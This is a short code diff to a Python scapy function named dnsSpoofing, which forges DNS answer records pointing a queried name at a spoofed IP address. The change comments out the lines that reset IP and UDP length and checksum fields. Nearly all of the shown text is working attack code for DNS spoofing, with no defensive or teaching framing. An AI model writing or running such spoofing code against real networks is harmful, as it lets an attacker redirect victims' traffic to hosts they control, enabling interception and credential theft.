@@ -30,10 +30,10 @@ def dnsSpoofing(targetIP, spoofIP):
     print(answer[scapy.DNS].summary())
     answer[scapy.DNS].an = scapy.DNSRR(rrname=answer[scapy.DNSQR].qname, ttl=10, rdata=spoofIP)
     answer[scapy.DNS].ancount = 1
-    del answer[scapy.IP].len
-    del answer[scapy.IP].chksum
-    del answer[scapy.UDP].len
-    del answer[scapy.UDP].chksum
+    # del answer[scapy.IP].len
+    # del answer[scapy.IP].chksum
+    # del answer[scapy.UDP].len
+    # del answer[scapy.UDP].chksum
     return answer
 
 def main():
